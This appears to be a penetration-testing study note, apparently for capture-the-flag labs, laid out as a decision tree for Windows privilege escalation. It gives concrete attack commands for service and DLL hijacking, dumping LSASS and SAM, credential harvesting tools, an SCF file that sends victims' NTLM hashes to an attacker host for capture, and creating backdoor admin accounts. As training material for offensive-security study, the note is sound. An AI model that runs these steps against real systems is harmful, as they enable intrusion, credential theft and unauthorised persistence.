# Windows Privilege Escalation, Decision Tree

Part of [[DECISION TREE]]. "I found X on a Windows box, what do I try for privesc?" Technique details in [[17. Windows Privilege Escalation|Windows Privilege Escalation]]. Exact syntax in [[Windows Privilege Escalation]].

---

## Got a shell. Where to start?

```mermaid
flowchart TD
    A["Landed a Windows shell\n(WinRM / nc / reverse shell / RDP)"] --> B["whoami /all\nwhoami /priv\nnet localgroup Administrators"]
    B --> C{Already admin or SYSTEM?}
    C -->|Yes| D["Read the flag. Done."]
    C -->|No| E["Step 1.5: Sensitive info hunt\nPSReadLine history, transcript files\nconfig files, cmdkey, registry AutoLogon"]
    E --> F{Credentials found?}
    F -->|Yes| G["Try them everywhere\nevil-winrm, RDP, runas, net use\nPassword reuse across all local users"]
    F -->|No| H["Step 2: Automated enumeration\nwinPEAS + PowerUp + Seatbelt"]
    G --> I{Lateral move worked?}
    I -->|Yes, now admin| D
    I -->|No| H
    H --> J["Review output: services, tasks,\npaths, privs, patches, creds in files"]
    J --> K{What did you find?}
```

---

## Service Vector Triage

```mermaid
flowchart TD
    A{Service finding} --> B["Writable service binary\nicacls shows Users:(W/F/M)"]
    A --> C["Missing DLL in writable dir\nNAME NOT FOUND in ProcMon\nor service log 'Couldn't load'"]
    A --> D["Unquoted service path with space\nno quotes, writable intermediate dir"]
    A --> E["Service has CanRestart:True\n(PowerUp output)"]
    B --> F["Replace binary with adduser payload\nsc stop/start or wait for restart trigger"]
    C --> G["Compile nostdlib DLL with payload\nplace in the dir, wait for service restart\ncheck: restart mechanism before planting"]
    D --> H["Plant payload at first space-ambiguous\ncomponent, start service"]
    E --> F
    G --> I{Restart trigger?}
    I -->|sc.exe works| F
    I -->|Access denied everywhere| J["Is there a scheduled task restarting it?\nschtasks /query -- hidden tasks show\n'There are no tasks at your access level'"]
    I -->|No trigger found| K["Pivot to scheduled tasks or kernel exploit\nDLL stays planted for if restart happens"]
```

---

## Scheduled Task Triage

Got a task running as a higher-priv user:
```mermaid
flowchart TD
    A["Task runs as admin/SYSTEM/non-standard user"] --> B{Can I write to the binary it calls?}
    B -->|Yes| C["Replace binary with payload\nwait for next run (check Next Run Time)"]
    B -->|No| D{Is the binary in a dir I can write to?}
    D -->|Yes| E["Replace binary at that path with payload\nsame result -- task calls our file"]
    D -->|No| F{Does the task call something I can influence?\ne.g. reads from a writable config}
    F -->|Yes| G["Modify the config to redirect execution"]
    F -->|No| H["Task not exploitable, try other vectors"]
```

Hidden tasks (access denied to list):
- `schtasks /query` shows `INFO: There are no scheduled tasks presently available at your access level` -- tasks DO exist, you just can't see them.
- Try: enumerate from a higher-priv context once you have it, or look for running processes that match task patterns.

---

## Kernel Exploit Triage

```mermaid
flowchart TD
    A["Check patch level\nGet-CimInstance win32_quickfixengineering\nSort-Object HotFixID"] --> B{KB5027215 present?}
    B -->|No| C["CVE-2023-29360 (MSStreamingProxy EoP)\nSpawns interactive cmd.exe\nNeeds RDP for usable shell OR pass a command arg"]
    B -->|Yes| D{KB5025221 / KB5025224 present?}
    D -->|No| E["CVE-2023-28252 (CLFS UAF)\nIn-process SYSTEM token swap\nPass 'cmd.exe /c <command>' arg\nNeeds write to C:\\Users\\Public\\"]
    D -->|Yes| F["Both patches present, try other vectors\nOr look for older CVEs matching exact build"]
    E --> G{C:\\Users\\Public\\ writable from current shell?}
    G -->|Yes| H["Run exploit directly"]
    G -->|No -- WinRM session| I["Try from nc/reverse shell as different user\nWinRM sessions can have tighter path ACLs\nthan interactive/nc shells"]
```

---

## Privilege Triage (whoami /priv)

| Privilege | Path |
|-----------|------|
| SeImpersonatePrivilege | SigmaPotato / GodPotato → SYSTEM |
| SeBackupPrivilege | Read any file (bypass ACLs with backup semantics) or dump SAM/SYSTEM hives |
| SeRestorePrivilege | Write any file (bypass ACLs) |
| SeDebugPrivilege | Dump LSASS memory → hashes → PtH or crack |
| SeAssignPrimaryTokenPrivilege | Potato family |
| SeLoadDriverPrivilege | Load a malicious kernel driver → SYSTEM |
| SeTakeOwnershipPrivilege | Take ownership of any file then modify its ACL |

SeBackupPrivilege path (Backup Operators member):
```mermaid
flowchart TD
    A["SeBackupPrivilege confirmed enabled"] --> B{Flag readable without backup semantics?}
    B -->|Yes| C["type flag.txt / Get-Content"]
    B -->|No -- access denied| D["Enable privilege in token via AdjustTokenPrivileges\nOpen file with FILE_FLAG_BACKUP_SEMANTICS\n(bypasses ACL checks when privilege active)"]
    D --> E{Can write output file to disk?}
    E -->|Yes| F["Read flag.txt → write to result.txt\ntype result.txt"]
    E -->|No| G["Dump SAM/SYSTEM hives (reg save)\ndownload + impacket-secretsdump offline\ncrack or PtH the admin hash"]
```

---

## Access Denied on sc.exe / Service Control

```mermaid
flowchart TD
    A["sc stop/start/control returns 'Access is denied'"] --> B["sc sdshow ServiceName\n(read DACL if you have READ_CONTROL)"]
    B --> C{DACL readable?}
    C -->|Yes| D["Parse SDDL: look for non-admin SID\nwith RP (SERVICE_START) rights\nFind who that SID is: Get-LocalUser/Group by RID"]
    C -->|No -- access denied| E["Try WMI: (Get-WmiObject Win32_Service -Filter 'Name=...')"]
    E --> F{WMI works?}
    F -->|Yes| G["$svc.StopService() / .StartService()"]
    F -->|No| H["No restart mechanism accessible\nPivot: kernel exploit, scheduled task,\nor plant DLL and wait"]
```

---

## WinRM vs nc Shell -- Which Has More Access?

If you have both a WinRM session and a nc/reverse shell:
- WinRM runs PowerShell in a constrained remote context. Some paths (`C:\Users\Public\`, certain pipes, interactive processes) can be denied even for users who'd normally have access.
- nc / reverse shells from scheduled tasks run in a more interactive-like context and can have different ACLs in practice.
- **Rule of thumb:** if something fails with access denied over WinRM and should theoretically work, try it from the nc/bind shell before assuming the technique doesn't work.

---

---

## whoami /priv shows non-default privilege — what to do?

| Privilege | Immediate technique |
|-----------|-------------------|
| `SeImpersonatePrivilege` | PrintSpoofer / JuicyPotato / SweetPotato → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Same as SeImpersonate |
| `SeBackupPrivilege` | Copy-FileSeBackupPrivilege / hive dump → hashes |
| `SeRestorePrivilege` | Write to any file regardless of ACL |
| `SeDebugPrivilege` | procdump lsass → mimikatz sekurlsa::logonpasswords |
| `SeTakeOwnershipPrivilege` | takeown /f → icacls /grant → read any file |
| `SeLoadDriverPrivilege` | EoPLoadDriver + Capcom.sys → SYSTEM shell |

Expanded privilege triage beyond the base module. See [[17. Windows Privilege Escalation|WPE.2]].

---

## id shows user is in a Windows built-in group — what to do?

| Group | Technique |
|-------|-----------|
| Backup Operators | SeBackupPrivilege → Copy-FileSeBackupPrivilege SAM/SYSTEM |
| Event Log Readers | `wevtutil qe Security /f:text \| Select-String "/user"` → cleartext creds in process creation logs |
| DnsAdmins | `dnscmd /config /serverlevelplugindll <malicious.dll>` → restart DNS → SYSTEM DLL load |
| Print Operators | SeLoadDriverPrivilege → EoPLoadDriver + ExploitCapcom → SYSTEM |
| Server Operators | `sc config <service> binPath= "cmd /c net localgroup Administrators <user> /add"` → sc start → local admin |

See [[17. Windows Privilege Escalation|WPE.7]] through [[17. Windows Privilege Escalation|WPE.11]].

---

## Credential hunting — where to look on Windows

```
Start: low-priv shell on Windows
         ↓
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml (from C:\Users)
         ↓
type C:\Windows\Panther\unattend.xml (provisioning creds)
         ↓
Get-LocalUser (check Description field for plaintext passwords)
         ↓
cat (Get-PSReadlineOption).HistorySavePath (PowerShell command history)
         ↓
Sticky Notes: plum.sqlite via PSSQLite (credentials pasted into notes)
         ↓
cmdkey /list (Credential Manager: saved RDP, web, domain creds)
         ↓
LaZagne.exe all (DB clients, browsers, WinSCP, Outlook, etc.)
         ↓
SharpChrome.exe logins /unprotect (Chrome saved passwords)
         ↓
SessionGopher (WinSCP registry, PuTTY sessions)
         ↓
mRemoteNG confCons.xml + mremoteng_decrypt.py (remote management tool)
```

See [[17. Windows Privilege Escalation|WPE.16]], [[17. Windows Privilege Escalation|WPE.18]].

---

## Found a writable share with other users browsing it

```
Writable file share (Public, IT, etc.) + active users detected?
         ↓
Create @Inventory.scf in the share:
  [Shell]
  Command=2
  IconFile=\\PWNIP\share\legit.ico
         ↓
Start Responder: sudo responder -w -v -I tun0
         ↓
Any user who opens the folder in Explorer triggers NTLM hash capture
         ↓
hashcat -m 5600 hash.txt rockyou.txt → cleartext password
```

See [[17. Windows Privilege Escalation|WPE.20]], [[17. Windows Privilege Escalation#SCF File Attack. Responder Hash Capture (HTB Supplementary)|Command Appendix]].

---

## System is missing patches — old Windows OS (Server 2008 R2 / Win 7)

```
systeminfo → few KBs installed → likely vulnerable
         ↓
Run Sherlock.ps1 (Find-AllVulns) on target
OR
Capture systeminfo output → run windows-exploit-suggester.py on Kali
         ↓
[E] or [M] entries = exploitable patches
         ↓
MS10-092 (Task Scheduler): MSF windows/local/ms10_092_schelevator → SYSTEM
MS16-032 (Secondary Logon): Invoke-MS16-032.ps1 → SYSTEM shell popup
```

See [[17. Windows Privilege Escalation|WPE.23]], [[17. Windows Privilege Escalation|WPE.24]].

---

## Kernel / CVE quick reference (HTB additions)

| CVE / Bulletin | Nickname | Target OS | Method |
|----------------|----------|-----------|--------|
| CVE-2021-36934 | HiveNightmare | Win10 1809-21H1 | VSS shadow SAM read → hash extraction |
| CVE-2021-1675 | PrintNightmare | All Windows (2021) | Spooler DLL injection → SYSTEM |
| MS10-092 | Task Scheduler XML | Win7/2008 R2 | MSF schelevator module |
| MS16-032 | Secondary Logon | Win7-10 | Invoke-MS16-032.ps1 |
| CVE-2023-29360/28252 | CLFS/Win32k | Win10/11/2022 | (existing appendix) |

---

## Citrix / VDI restricted environment

```
Restricted desktop: only approved apps accessible
         ↓
Option 1: Open/Save dialog trick
  Open Paint → File → Open → type \\127.0.0.1\c$\users\<user> → All Files
  Browse full filesystem via UNC in the Open dialog
         ↓
Option 2: SMB share + cmd.exe launcher
  Attacker: smbserver.py -smb2support share ./
  In Open dialog: \\PWNIP\share → find cmd.exe or .exe → right-click → Open
         ↓
From cmd.exe: powershell -ep bypass → PowerUp.ps1 Write-UserAddMSI
→ Run UserAdd.msi → create local admin user
→ runas /user:backdoor cmd → Bypass-UAC.ps1 → SYSTEM
```

See [[17. Windows Privilege Escalation|WPE.19]].

#### Tags: #WindowsPrivesc #DecisionTree #KernelExploit #DLLHijack #SeImpersonatePrivilege #SeBackupPrivilege #ServiceBinaryHijacking #ScheduledTasks #UnquotedServicePath #CVE202328252 #CVE202329360 #Module17 #SeDebugPrivilege #SeTakeOwnershipPrivilege #SeLoadDriverPrivilege #DnsAdmins #ServerOperators #EventLogReaders #HiveNightmare #PrintNightmare #CredentialHunting #SCFAttack #CitrixBreakout #HTBSupplementary
